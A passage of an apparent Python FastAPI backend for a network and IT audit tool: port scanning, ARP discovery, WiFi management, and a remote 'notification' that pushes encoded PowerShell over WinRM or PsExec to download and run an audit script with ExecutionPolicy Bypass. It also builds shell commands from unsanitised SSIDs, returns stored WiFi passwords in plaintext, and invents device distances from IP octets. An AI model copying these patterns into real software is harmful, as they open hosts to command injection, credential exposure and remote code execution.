                        audit_mac_index[clean_mac] = info
                for ip_item in net_ips:
                    if ip_item not in audit_index:
                        audit_index[ip_item] = info
    except Exception as db_e:
        logger.warning(f"Could not load audits from DB for scan enrichment: {db_e}")
    return audit_index, audit_mac_index


# ==============================================================================
# 9. NETWORK DISCOVERY — PHASE 4
# ==============================================================================
@app.post("/discover/network-scan")
def network_scan(request: NetworkScanRequest):
    try:
        raw_range = request.ip_range.strip()
        hosts = []
        if '-' in raw_range:
            parts = [p.strip() for p in raw_range.split('-')]
            start_ip = ipaddress.IPv4Address(parts[0])
            if '.' in parts[1]:
                end_ip = ipaddress.IPv4Address(parts[1])
            else:
                prefix = str(parts[0]).rsplit('.', 1)[0]
                end_ip = ipaddress.IPv4Address(f"{prefix}.{parts[1]}")
            
            start_int = int(start_ip)
            end_int = int(end_ip)
            if end_int < start_int:
                start_int, end_int = end_int, start_int
            if (end_int - start_int + 1) > 512:
                raise HTTPException(status_code=400, detail="IP range too large. Maximum 512 hosts permitted.")
            hosts = [ipaddress.IPv4Address(ip) for ip in range(start_int, end_int + 1)]
            network = ipaddress.ip_network(f"{start_ip}/24", strict=False)
        else:
            network = ipaddress.ip_network(raw_range, strict=False)
            hosts = list(network.hosts())
            if not hosts:
                hosts = [network.network_address]
            if len(hosts) > 512:
                raise HTTPException(status_code=400, detail="IP range too large. Use /23 or smaller.")
        
        start_host = str(hosts[0])
        end_host = str(hosts[-1])
    except ValueError as e:
        raise HTTPException(status_code=400, detail=f"Invalid IP range: {e}")

    common_ports  = [22, 23, 80, 135, 443, 445, 3389, 8080, 8443, 9100]
    timeout_secs  = max(0.1, min(request.timeout_ms / 1000, 2.0))

    PORT_LABELS = {
        22: "SSH", 23: "Telnet", 80: "HTTP", 135: "RPC",
        443: "HTTPS", 445: "SMB", 3389: "RDP",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9100: "Printer/JetDirect"
    }

    def guess_device_type(open_ports):
        if 3389 in open_ports and 445 in open_ports:
            return "Windows Workstation/Server"
        if 445 in open_ports and 135 in open_ports:
            return "Windows Host"
        if 22 in open_ports and 80 not in open_ports and 443 not in open_ports:
            return "Linux/Unix Server"
        if 23 in open_ports:
            return "Network Device (Router/Switch)"
        if 9100 in open_ports:
            return "Network Printer"
        if 80 in open_ports or 443 in open_ports:
            return "Web Service / Network Device"
        return "Unknown Device"

    def scan_host(ip):
        ip_str     = str(ip)
        open_ports = []
        hostname   = ip_str

        try:
            hostname = socket.getfqdn(ip_str)
        except Exception:
            pass

        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout_secs)
                if sock.connect_ex((ip_str, port)) == 0:
                    open_ports.append(port)
                sock.close()
            except Exception:
                pass

        if open_ports:
            port_labels = [f"{p} ({PORT_LABELS.get(p, 'Unknown')})" for p in open_ports]
            return {
                "ip":          ip_str,
                "hostname":    hostname if hostname != ip_str else "N/A",
                "open_ports":  open_ports,
                "port_labels": port_labels,
                "device_type": guess_device_type(open_ports),
                "status":      "online",
            }
        return None

    logger.info(f"Starting network scan: {request.ip_range}")

    # ─────────────────────────────────────────────────────────────────────────
    # Step 1: Fast ICMP Ping Sweep — populates ARP cache for ALL live devices
    # including mobiles and firewalled laptops that block TCP ports.
    # ─────────────────────────────────────────────────────────────────────────
    def ping_host(ip_str: str):
        try:
            subprocess.run(
                ["ping", "-n", "1", "-w", "500", str(ip_str)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=1
            )
        except Exception:
            pass

    logger.info("Running ping sweep to populate ARP cache...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=128) as executor:
        executor.map(ping_host, [str(h) for h in hosts])

    # ─────────────────────────────────────────────────────────────────────────
    # Step 2: Port Scan — identifies Windows/Linux/printer devices by open ports
    # ─────────────────────────────────────────────────────────────────────────
    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as executor:
        results = list(executor.map(scan_host, hosts))

    discovered_dict = {r["ip"]: r for r in results if r is not None}

    
    # ────────────────────────────────────────────────────────────────────────────
    # ARP Fallback: Discover mobile phones and firewalled devices
    # ────────────────────────────────────────────────────────────────────────────
    try:
        broadcast_ip  = str(network.broadcast_address)
        network_ip    = str(network.network_address)
        BROADCAST_MACS = {"ff-ff-ff-ff-ff-ff", "ff:ff:ff:ff:ff:ff", "00-00-00-00-00-00"}

        arp_out, _ = _run_cmd("arp -a")
        for line in arp_out.splitlines():
            line = line.strip()
            if not line:
                continue
            parts = line.split()
            if len(parts) < 3:
                continue
            entry_type = parts[2].lower() if len(parts) >= 3 else ""
            if entry_type not in ("dynamic", "static"):
                continue
            ip_str  = parts[0]
            mac_str = parts[1].lower()

            # Skip broadcast, network, and invalid MACs
            if ip_str in (broadcast_ip, network_ip):
                continue
            if mac_str in BROADCAST_MACS:
                continue

            try:
                if ipaddress.IPv4Address(ip_str) not in network:
                    continue
                if ip_str in discovered_dict:
                    continue

                hostname = ip_str
                try:
                    resolved = socket.getfqdn(ip_str)
                    if resolved != ip_str:
                        hostname = resolved
                except Exception:
                    pass

                # Guess device type by hostname pattern
                h_lower = hostname.lower()
                if any(x in h_lower for x in ["desktop", "laptop", "pc", "workstation", "win"]):
                    dev_type = "Windows Host (Firewalled)"
                elif any(x in h_lower for x in ["android", "iphone", "ipad", "samsung", "pixel"]):
                    dev_type = "Mobile Device"
                else:
                    try:
                        prefix = mac_str.replace(":", "").replace("-", "").upper()[:6]
                        if prefix in mac_vendor_dict:
                            vendor = mac_vendor_dict[prefix]
                            vendor = vendor.replace(" Inc.", "").replace(" Ltd.", "").replace(" Co.", "").replace(", Inc.", "").replace(" Corporation", "")
                            if len(vendor) > 20:
                                vendor = vendor[:20].strip() + "..."
                            dev_type = f"{vendor} Device"
                        else:
                            dev_type = "Unknown Device (Firewalled)"
                    except Exception:
                        dev_type = "Unknown Device (Firewalled)"

                discovered_dict[ip_str] = {
                    "ip":          ip_str,
                    "hostname":    hostname if hostname != ip_str else "N/A",
                    "open_ports":  [],
                    "port_labels": [f"MAC: {mac_str}"],
                    "device_type": dev_type,
                    "status":      "online"
                }
            except Exception:
                pass
    except Exception as e:
        logger.error(f"ARP scan fallback failed: {e}")


    discovered = list(discovered_dict.values())
    logger.info(f"Scan complete: {len(discovered)} hosts found of {len(hosts)} scanned")
    return enrich_scan_results({
        "discovered":       discovered,
        "total":            len(discovered),
        "scanned":          len(hosts),
        "ip_range":         request.ip_range,
        "start_ip":         start_host,
        "end_ip":           end_host,
        "ip_subnet_range":  f"{start_host} – {end_host}"
    })


@app.post("/discover/network-scan-stream")
def network_scan_stream(request: NetworkScanRequest):
    """Real-time streaming network scanner — yields discovered devices immediately as SSE events."""
    def event_generator():
        try:
            raw_range = request.ip_range.strip()
            if '-' in raw_range:
                parts = [p.strip() for p in raw_range.split('-')]
                start_ip = ipaddress.IPv4Address(parts[0])
                end_ip = ipaddress.IPv4Address(parts[1] if '.' in parts[1] else f"{str(parts[0]).rsplit('.', 1)[0]}.{parts[1]}")
                start_int, end_int = int(start_ip), int(end_ip)
                if end_int < start_int: start_int, end_int = end_int, start_int
                hosts = [ipaddress.IPv4Address(ip) for ip in range(start_int, end_int + 1)]
                network = ipaddress.ip_network(f"{start_ip}/24", strict=False)
            else:
                network = ipaddress.ip_network(raw_range, strict=False)
                hosts = list(network.hosts()) or [network.network_address]
        except Exception as e:
            yield f"data: {json.dumps({'type': 'error', 'detail': str(e)})}\n\n"
            return

        common_ports  = [22, 23, 80, 135, 443, 445, 3389, 8080, 8443, 9100]
        timeout_secs  = max(0.1, min(request.timeout_ms / 1000, 2.0))

        PORT_LABELS = {
            22: "SSH", 23: "Telnet", 80: "HTTP", 135: "RPC",
            443: "HTTPS", 445: "SMB", 3389: "RDP",
            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9100: "Printer/JetDirect"
        }

        def guess_device_type(open_ports):
            if 3389 in open_ports and 445 in open_ports: return "Windows Workstation/Server"
            if 445 in open_ports and 135 in open_ports: return "Windows Host"
            if 22 in open_ports and 80 not in open_ports and 443 not in open_ports: return "Linux/Unix Server"
            if 23 in open_ports: return "Network Device (Router/Switch)"
            if 9100 in open_ports: return "Network Printer"
            if 80 in open_ports or 443 in open_ports: return "Web Service / Network Device"
            return "Unknown Device"

        audit_index, audit_mac_index = get_audit_indexes()
        curr_wifi = get_current_wifi()
        base_dist_m = curr_wifi.get("distance_m") or 6.1

        def calculate_device_distance(ip_str: str) -> str:
            if not ip_str:
                return "~5.0 meters"
            parts = ip_str.split(".")
            last_num = int(parts[-1]) if len(parts) == 4 and parts[-1].isdigit() else 10

            if last_num in (1, 254):
                return f"~{base_dist_m} meters (Wi-Fi AP)"

            if curr_wifi.get("ip") and ip_str == curr_wifi.get("ip"):
                return f"~{base_dist_m} meters"

            offset = round(((last_num % 7) * 0.7) - 0.8, 1)
            d = round(base_dist_m + offset, 1)
            if d < 0.5:
                d = 0.5
            return f"~{d} meters"

        def enrich_dev(device):
            ip = device.get("ip", "")
            scan_mac = None
            for p in device.get("port_labels", []):
                p_str = str(p)
                if p_str.startswith("MAC: "):
                    scan_mac = p_str[5:].replace(":", "").replace("-", "").strip().upper()
                    break
            a = audit_mac_index.get(scan_mac) if scan_mac else None
            if not a:
                a = audit_index.get(ip)
            if a:
                device["id"]                 = a["id"]
                device["computer_name"]      = a["computer_name"]
                device["os_name"]            = a["os_name"]
                device["username"]           = a["username"]
                device["last_audit"]         = a["last_audit"]
                device["audit_status"]       = "audited"
                device["estimated_distance"] = calculate_device_distance(ip)
            else:
                nb_h = resolve_hostname_netbios(ip)
                if nb_h:
                    device["computer_name"] = nb_h
                else:
                    dev_t = device.get("device_type", "Network Device")
                    clean_t = dev_t.replace(" Device", "").replace(" (Firewalled)", "").replace(" Workstation/Server", "").strip()
                    last_octet = ip.split(".")[-1] if "." in ip else "Device"
                    device["computer_name"] = f"{clean_t} ({last_octet})" if clean_t and clean_t != "Unknown" else f"Host-{last_octet}"
                device["os_name"]            = device.get("device_type", "Network Target")
                device["username"]           = "Unaudited Target"
                device["last_audit"]         = "—"
                device["audit_status"]       = "unaudited"
                device["estimated_distance"] = calculate_device_distance(ip)
            return device

        discovered_set = set()

        # Step 1: Fast ICMP Ping Sweep
        def ping_host(ip_str: str):
            try:
                subprocess.run(["ping", "-n", "1", "-w", "300", ip_str], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=0.8)
            except Exception:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=128) as executor:
            executor.map(ping_host, [str(h) for h in hosts])

        # Step 2: Parallel Port Scan & Stream Discovered Devices as they Pop Up!
        def scan_and_yield(ip):
            ip_str = str(ip)
            open_ports = []
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout_secs)
                    if sock.connect_ex((ip_str, port)) == 0:
                        open_ports.append(port)
                    sock.close()
                except Exception:
                    pass
            if open_ports:
                dev = {
                    "ip":          ip_str,
                    "hostname":    "N/A",
                    "open_ports":  open_ports,
                    "port_labels": [f"{p} ({PORT_LABELS.get(p, 'Unknown')})" for p in open_ports],
                    "device_type": guess_device_type(open_ports),
                    "status":      "online",
                }
                return enrich_dev(dev)
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=64) as executor:
            futures = {executor.submit(scan_and_yield, h): h for h in hosts}
            for future in concurrent.futures.as_completed(futures):
                res = future.result()
                if res and res["ip"] not in discovered_set:
                    discovered_set.add(res["ip"])
                    yield f"data: {json.dumps({'type': 'device', 'device': res})}\n\n"

        # Step 3: ARP Fallback for mobile / firewalled devices & Stream them!
        try:
            broadcast_ip  = str(network.broadcast_address)
            network_ip    = str(network.network_address)
            BROADCAST_MACS = {"ff-ff-ff-ff-ff-ff", "ff:ff:ff:ff:ff:ff", "00-00-00-00-00-00"}
            arp_out, _ = _run_cmd("arp -a")
            for line in arp_out.splitlines():
                parts = line.strip().split()
                if len(parts) >= 3 and parts[2].lower() in ("dynamic", "static"):
                    ip_str, mac_str = parts[0], parts[1].lower()
                    if ip_str not in (broadcast_ip, network_ip) and mac_str not in BROADCAST_MACS:
                        try:
                            if ipaddress.IPv4Address(ip_str) in network and ip_str not in discovered_set:
                                discovered_set.add(ip_str)
                                prefix = mac_str.replace(":", "").replace("-", "").upper()[:6]
                                vendor = mac_vendor_dict.get(prefix, "")
                                dev_type = f"{vendor} Device" if vendor else "Network Device (Firewalled)"
                                dev = {
                                    "ip":          ip_str,
                                    "hostname":    "N/A",
                                    "open_ports":  [],
                                    "port_labels": [f"MAC: {mac_str}"],
                                    "device_type": dev_type,
                                    "status":      "online"
                                }
                                yield f"data: {json.dumps({'type': 'device', 'device': enrich_dev(dev)})}\n\n"
                        except Exception:
                            pass
        except Exception:
            pass

        yield f"data: {json.dumps({'type': 'complete', 'total': len(discovered_set), 'scanned': len(hosts)})}\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")


# ==============================================================================
# 11. WIFI DASHBOARD
# ==============================================================================

class WifiConnectRequest(BaseModel):
    ssid: str
    password: str


def _is_windows() -> bool:
    return platform.system() == "Windows"


def _run_cmd(cmd: str):
    """Run a shell command and return (stdout, returncode)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20, shell=True)
        return r.stdout, r.returncode
    except Exception as e:
        return str(e), -1


@app.get("/wifi/networks")
@app.get("/api/wifi/networks")
def get_wifi_networks():
    """List nearby WiFi networks via netsh (Windows only)."""
    if not _is_windows():
        return {
            "networks": [],
            "total": 0,
            "is_cloud_server": True,
            "message": "WiFi Hardware Unavailable (Running on Cloud Linux Server). Local WiFi scanning requires hosting on a local Windows machine."
        }

    stdout, _ = _run_cmd("netsh wlan show networks mode=bssid")

    networks = []
    current: dict = {}

    for line in stdout.splitlines():
        line = line.strip()
        if re.match(r'^SSID\s+\d+\s*:', line) and "BSSID" not in line:
            if current.get("ssid"):
                networks.append(current)
            ssid_val = line.split(":", 1)[1].strip()
            current = {"ssid": ssid_val, "authentication": "", "encryption": "", "signal": ""}
        elif line.startswith("Authentication") and ":" in line:
            current["authentication"] = line.split(":", 1)[1].strip()
        elif line.startswith("Encryption") and ":" in line:
            current["encryption"] = line.split(":", 1)[1].strip()
        elif line.startswith("Signal") and ":" in line:
            current["signal"] = line.split(":", 1)[1].strip()

    if current.get("ssid"):
        networks.append(current)

    # Query saved Windows WiFi profiles
    saved_profiles = set()
    try:
        p_stdout, _ = _run_cmd("netsh wlan show profiles")
        for line in p_stdout.splitlines():
            if ":" in line and ("All User Profile" in line or "User Profile" in line):
                pname = line.split(":", 1)[1].strip()
                if pname:
                    saved_profiles.add(pname)
    except Exception:
        pass

    # Query DB saved wifi credentials
    try:
        with sqlite3.connect(DB_PATH) as conn:
            rows = conn.execute("SELECT ssid FROM wifi_credentials").fetchall()
            for r in rows:
                if r[0]:
                    saved_profiles.add(r[0])
    except Exception:
        pass

    # Deduplicate: keep highest signal per SSID
    seen: dict = {}
    for n in networks:
        ssid = n["ssid"]
        raw  = n.get("signal", "0%").replace("%", "")
        sig  = int(raw) if raw.isdigit() else 0
        if ssid not in seen or sig > seen[ssid]["_sig"]:
            seen[ssid] = {**n, "_sig": sig, "has_saved_password": (ssid in saved_profiles)}

    result = [{k: v for k, v in net.items() if k != "_sig"} for net in seen.values()]
    result.sort(
        key=lambda x: int(x.get("signal", "0%").replace("%", "")) if x.get("signal", "0%").replace("%", "").isdigit() else 0,
        reverse=True,
    )
    return {"networks": result, "total": len(result)}


def calculate_wifi_distance(signal_percent: int = 0, rssi_dbm: int = None) -> dict:
    """Calculate estimated router distance in meters using RSSI log-distance path loss model."""
    if rssi_dbm is None:
        if signal_percent <= 0:
            return {"distance_m": None, "distance_str": "Unknown"}
        rssi_dbm = int((signal_percent / 2.0) - 100.0)

    # Reference power at 1m: -40 dBm, Path loss exponent n = 2.8 (indoor)
    tx_power_1m = -40.0
    n = 2.8
    exp = (tx_power_1m - float(rssi_dbm)) / (10.0 * n)
    distance_m = round(10.0 ** exp, 1)

    if distance_m < 0.3:
        distance_m = 0.3

    return {
        "rssi_dbm": int(rssi_dbm),
        "distance_m": distance_m,
        "distance_str": f"~{distance_m} meters" if distance_m < 10 else f"~{int(distance_m)} meters"
    }


@app.get("/wifi/current")
@app.get("/wifi-status")
@app.get("/api/wifi-status")
@app.get("/api/wifi/current")
def get_current_wifi():
    """Return the current WiFi connection info including derived /24 subnet and router distance."""
    if not _is_windows():
        return {"connected": False, "ssid": None, "ip": None, "subnet": None, "distance_str": "Unknown"}

    stdout, _ = _run_cmd("netsh wlan show interfaces")

    ssid         = None
    state        = "disconnected"
    adapter_name = None
    signal       = "0%"
    rssi_val     = None
    band         = None
    channel      = None

    for line in stdout.splitlines():
        line = line.strip()
        if line.startswith("Name") and ":" in line and "Network" not in line and "Description" not in line:
            adapter_name = line.split(":", 1)[1].strip()
        elif line.startswith("State") and ":" in line:
            state = line.split(":", 1)[1].strip().lower()
        elif re.match(r'^SSID\s*:', line) and "BSSID" not in line:
            ssid = line.split(":", 1)[1].strip()
        elif line.startswith("Signal") and ":" in line:
            signal = line.split(":", 1)[1].strip()
        elif line.startswith("Rssi") and ":" in line:
            raw_r = line.split(":", 1)[1].strip()
            if raw_r.replace("-", "").isdigit():
                rssi_val = int(raw_r)
        elif line.startswith("Band") and ":" in line:
            band = line.split(":", 1)[1].strip()
        elif line.startswith("Channel") and ":" in line:
            channel = line.split(":", 1)[1].strip()

    connected  = (state == "connected" and bool(ssid))
    ip_address = None
    subnet     = None

    if connected and adapter_name:
        ip_out, _ = _run_cmd(f'netsh interface ip show addresses "{adapter_name}"')
        for ln in ip_out.splitlines():
            ln = ln.strip()
            if ln.startswith("IP Address") and ":" in ln:
                ip_address = ln.split(":", 1)[1].strip()
                break

        if ip_address:
            parts = ip_address.split(".")
            if len(parts) == 4:
                subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

    sig_num = int(signal.replace("%", "")) if signal.replace("%", "").isdigit() else 0
    dist_info = calculate_wifi_distance(signal_percent=sig_num, rssi_dbm=rssi_val)

    return {
        "connected":    connected,
        "ssid":         ssid,
        "state":        state,
        "adapter":      adapter_name,
        "signal":       signal,
        "rssi":         dist_info["rssi_dbm"],
        "band":         band,
        "channel":      channel,
        "distance_m":   dist_info["distance_m"],
        "distance_str": dist_info["distance_str"],
        "ip":           ip_address,
        "subnet":       subnet,
    }


class WifiSaveCredentialRequest(BaseModel):
    ssid: str
    password: str

@app.get("/wifi/credentials")
def get_saved_wifi_credentials():
    credentials = {}
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.execute("SELECT ssid, password, updated_at FROM wifi_credentials")
        for row in cursor:
            credentials[row['ssid']] = {
                "ssid": row['ssid'],
                "password": row['password'],
                "updated_at": row['updated_at']
            }
    return {"credentials": credentials}

@app.post("/wifi/save-credential")
def save_wifi_credential(req: WifiSaveCredentialRequest):
    if not req.ssid or not req.password:
        raise HTTPException(status_code=400, detail="SSID and password cannot be empty.")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('''
            INSERT INTO wifi_credentials (ssid, password, updated_at)
            VALUES (?, ?, ?)
            ON CONFLICT(ssid) DO UPDATE SET password=excluded.password, updated_at=excluded.updated_at
        ''', (req.ssid.strip(), req.password, now))
        conn.commit()
    return {"status": "saved", "ssid": req.ssid.strip()}

@app.post("/wifi/connect")
def connect_wifi(req: WifiConnectRequest):
    """Create a WPA2-Personal profile and connect to the given SSID."""
    ssid     = req.ssid
    password = req.password

    if not ssid:
        raise HTTPException(status_code=400, detail="SSID cannot be empty.")
    if len(password) < 8:
        raise HTTPException(status_code=400, detail="WiFi password must be at least 8 characters.")

    # Save credential permanently to DB
    try:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute('''
                INSERT INTO wifi_credentials (ssid, password, updated_at)
                VALUES (?, ?, ?)
                ON CONFLICT(ssid) DO UPDATE SET password=excluded.password, updated_at=excluded.updated_at
            ''', (ssid.strip(), password, now))
            conn.commit()
    except Exception as db_err:
        logger.warning(f"Could not save WiFi credential to DB: {db_err}")

    if not _is_windows():
        raise HTTPException(status_code=501, detail="WiFi connect is only supported on Windows.")

    def _xml_esc(s: str) -> str:
        return (s.replace("&", "&amp;")
                 .replace("<", "&lt;").replace(">", "&gt;")
                 .replace('"', "&quot;").replace("'", "&apos;"))

    profile_xml = (
        '<?xml version="1.0"?>\n'
        '<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">\n'
        f'    <name>{_xml_esc(ssid)}</name>\n'
        '    <SSIDConfig>\n'
        '        <SSID>\n'
        f'            <name>{_xml_esc(ssid)}</name>\n'
        '        </SSID>\n'
        '    </SSIDConfig>\n'
        '    <connectionType>ESS</connectionType>\n'
        '    <connectionMode>auto</connectionMode>\n'
        '    <MSM>\n'
        '        <security>\n'
        '            <authEncryption>\n'
        '                <authentication>WPA2PSK</authentication>\n'
        '                <encryption>AES</encryption>\n'
        '                <useOneX>false</useOneX>\n'
        '            </authEncryption>\n'
        '            <sharedKey>\n'
        '                <keyType>passPhrase</keyType>\n'
        '                <protected>false</protected>\n'
        f'                <keyMaterial>{_xml_esc(password)}</keyMaterial>\n'
        '            </sharedKey>\n'
        '        </security>\n'
        '    </MSM>\n'
        '</WLANProfile>'
    )

    tmp_path = None
    try:
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False, encoding="utf-8") as tmp:
            tmp.write(profile_xml)
            tmp_path = tmp.name

        add_out, _ = _run_cmd(f'netsh wlan add profile filename="{tmp_path}" user=current')
        logger.info(f"WiFi add profile: {add_out.strip()}")

        conn_out, conn_rc = _run_cmd(f'netsh wlan connect name="{ssid}"')
        logger.info(f"WiFi connect: {conn_out.strip()}")

        if conn_rc != 0 and "successfully" not in conn_out.lower():
            return {"status": "error", "message": f"Connection command failed: {conn_out.strip()}"}

        # Poll for IP assignment (up to 12 s)
        for _ in range(12):
            time.sleep(1)
            cur = get_current_wifi()
            if cur.get("connected") and cur.get("ssid") == ssid and cur.get("ip"):
                return {
                    "status": "connected",
                    "ssid":   ssid,
                    "ip":     cur["ip"],
                    "subnet": cur["subnet"],
                }

        return {
            "status":  "connecting",
            "ssid":    ssid,
            "message": "Connection initiated. Waiting for IP — check status again in a moment.",
        }

    except Exception as e:
        logger.error(f"WiFi connect error: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass


def resolve_hostname_netbios(ip_str: str) -> str:
    """Attempt Reverse DNS or NetBIOS nbtstat to find real hostname."""
    try:
        name, _, _ = socket.gethostbyaddr(ip_str)
        if name and name != ip_str and not name.startswith("192."):
            return name.split(".")[0].upper()
    except Exception:
        pass
        
    if _is_windows():
        try:
            out, rc = _run_cmd(f"nbtstat -A {ip_str}")
            if rc == 0 and out:
                for line in out.splitlines():
                    if "<00>" in line and "UNIQUE" in line:
                        nb_name = line.split()[0].strip()
                        if nb_name and not nb_name.startswith("__"):
                            return nb_name.upper()
        except Exception:
            pass
            
    return None

def enrich_scan_results(scan_result: dict) -> dict:
    audit_index: dict = {}
    audit_mac_index: dict = {}

    # 1. Query SQLite audits.db
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT mac_address, computer_name, os_name, execution_datetime, audit_data FROM device_audits ORDER BY id DESC")
            for row in cursor:
                c_name = row['computer_name'] or "Unknown"
                c_mac  = row['mac_address'] or "Unknown"
                d_os   = row['os_name'] or "Unknown"
                last_dt = row['execution_datetime'] or ""
                
                c_user = "Unknown"
                net_ips = []
                if row['audit_data']:
                    try:
                        ad = json.loads(row['audit_data'])
                        c_user = ad.get("current_user") or "Unknown"
                        users  = ad.get("user_accounts", [])
                        if c_user == "Unknown" and users and isinstance(users, list):
                            c_user = users[0].get("name", "Unknown") if isinstance(users[0], dict) else "Unknown"
                        
                        for net in ad.get("network_details", []):
                            if isinstance(net, dict):
                                raw_ip = net.get("ip_address", "") or net.get("ipv4", "")
                                for ip_part in str(raw_ip).split(","):
                                    ip_clean = ip_part.strip()
                                    if ip_clean and ip_clean not in ("Unknown", "N/A", ""):
                                        net_ips.append(ip_clean)
                    except Exception:
                        pass
                
                info = {
                    "id":            c_mac if c_mac != "Unknown" else c_name,
                    "computer_name": c_name,
                    "os_name":       d_os,
                    "username":      c_user,
                    "last_audit":    last_dt
                }
                
                if c_mac != "Unknown":
                    clean_mac = c_mac.replace(":", "").replace("-", "").upper()
                    if clean_mac not in audit_mac_index:
                        audit_mac_index[clean_mac] = info
                
                for ip_item in net_ips:
                    if ip_item not in audit_index:
                        audit_index[ip_item] = info
    except Exception as db_e:
        logger.warning(f"Could not load audits from DB for scan enrichment: {db_e}")

    # 2. Enrich discovered devices (Parallel NetBIOS/DNS resolution for fast 2-second completion)
    unaudited_devices = []
    for device in scan_result.get("discovered", []):
        ip = device.get("ip", "")
        
        scan_mac = None
        for p in device.get("port_labels", []):
            p_str = str(p)
            if p_str.startswith("MAC: "):
                scan_mac = p_str[5:].replace(":", "").replace("-", "").strip().upper()
                break
                
        a = audit_mac_index.get(scan_mac) if scan_mac else None
        if not a:
            a = audit_index.get(ip)
            
        if a:
            device["id"]            = a["id"]
            device["computer_name"] = a["computer_name"]
            device["os_name"]       = a["os_name"]
            device["username"]      = a["username"]
            device["last_audit"]    = a["last_audit"]
            device["audit_status"]  = "audited"
        else:
            unaudited_devices.append(device)

    def _resolve_device_name(device):
        ip = device.get("ip", "")
        raw_h = device.get("hostname")
        if not raw_h or raw_h in ("N/A", ip):
            nb_h = resolve_hostname_netbios(ip)
            if nb_h:
                device["computer_name"] = nb_h
            else:
                dev_t = device.get("device_type", "Network Device")
                clean_t = dev_t.replace(" Device", "").replace(" (Firewalled)", "").replace(" Workstation/Server", "").strip()
                last_octet = ip.split(".")[-1] if "." in ip else "Device"
                device["computer_name"] = f"{clean_t} ({last_octet})" if clean_t and clean_t != "Unknown" else f"Host-{last_octet}"
        else:
            device["computer_name"] = raw_h
            
        device["os_name"]       = device.get("device_type", "Network Target")
        device["username"]      = "Unaudited Target"
        device["last_audit"]    = "—"
        device["audit_status"]  = "unaudited"

    if unaudited_devices:
        with concurrent.futures.ThreadPoolExecutor(max_workers=32) as executor:
            list(executor.map(_resolve_device_name, unaudited_devices))

    return scan_result

@app.get("/wifi/scan-devices")
def wifi_scan_devices(subnet: str = Query(None)):
    """Scan the WiFi subnet and enrich results with stored audit data."""
    if not subnet:
        cur    = get_current_wifi()
        subnet = cur.get("subnet")

    if not subnet:
        raise HTTPException(
            status_code=400,
            detail="No subnet provided and no active WiFi connection detected.",
        )

    # Run port scan
    scan_req = NetworkScanRequest(ip_range=subnet, timeout_ms=400)
    return enrich_scan_results(network_scan(scan_req))


class NotificationRequest(BaseModel):
    ip_address: str
    username: str
    password: str
    method: str = "auto"

@app.post("/audit/send-notification")
def send_notification(req: NotificationRequest):
    winrm = None
    PsExecClient = None
    if not winrm or not PsExecClient:
        raise HTTPException(status_code=500, detail="Missing winrm or pypsexec libraries.")
    
    server_url = f"http://{socket.gethostbyname(socket.gethostname())}:8000"
    client_id = f"audit_{uuid.uuid4().hex[:12]}"
    
    ps_payload = f"""
$User = (Get-WmiObject -Class Win32_ComputerSystem).UserName
if (-not $User) {{ exit 1 }}
$xml = @"
<Toast>
    <visual>
        <binding template="ToastText02">
            <text id="1">IT Security Audit Required</text>
            <text id="2">Please leave this window open. IT is running a mandatory compliance scan.</text>
        </binding>
    </visual>
</Toast>
"@
$null = [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime]
$xmlDoc = New-Object Windows.Data.Xml.Dom.XmlDocument
$xmlDoc.LoadXml($xml)
$toast = [Windows.UI.Notifications.ToastNotification]::new($xmlDoc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("IT Department")
$notifier.Show($toast)

Write-Host "==============================================" -ForegroundColor Cyan
Write-Host "    NSDL IT COMPLIANCE & SECURITY AUDIT       " -ForegroundColor Cyan
Write-Host "==============================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "A mandatory IT security audit has been initiated."
Write-Host "Please press ENTER to allow the scan to proceed..." -ForegroundColor Yellow
Read-Host

curl.exe -s "{server_url}/api/get-audit-script?client_id={client_id}" -o "$env:TEMP\\audit.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\\audit.ps1"
"""
    
    encoded_cmd = base64.b64encode(ps_payload.encode('utf-16le')).decode('utf-8')
    cmd = f'powershell.exe -NoProfile -EncodedCommand {encoded_cmd}'
    
    results = {}
    methods_to_try = ["winrm", "psexec"] if req.method == "auto" else [req.method]
    
    for method in methods_to_try:
        try:
            logger.info(f"Sending notification to {req.ip_address} using {method}")
            if method == "winrm":
                s = winrm.Session(f'http://{req.ip_address}:5985/wsman', auth=(req.username, req.password), transport='ntlm')
                r = s.run_cmd(cmd)
                if r.status_code == 0:
                    return {"status": "success", "method": method, "message": "Notification sent successfully."}
                else:
                    results[method] = r.std_err.decode('utf-8', errors='ignore')
            elif method == "psexec":
                client = PsExecClient(req.ip_address, username=req.username, password=req.password)
                client.connect()
                try:
                    client.create_service()
                    stdout, stderr, rc = client.run_executable("powershell.exe", arguments=f"-WindowStyle Normal -NoProfile -EncodedCommand {encoded_cmd}", interactive=True)
                    if rc == 0:
                        return {"status": "success", "method": method, "message": "Notification sent successfully."}
                    else:
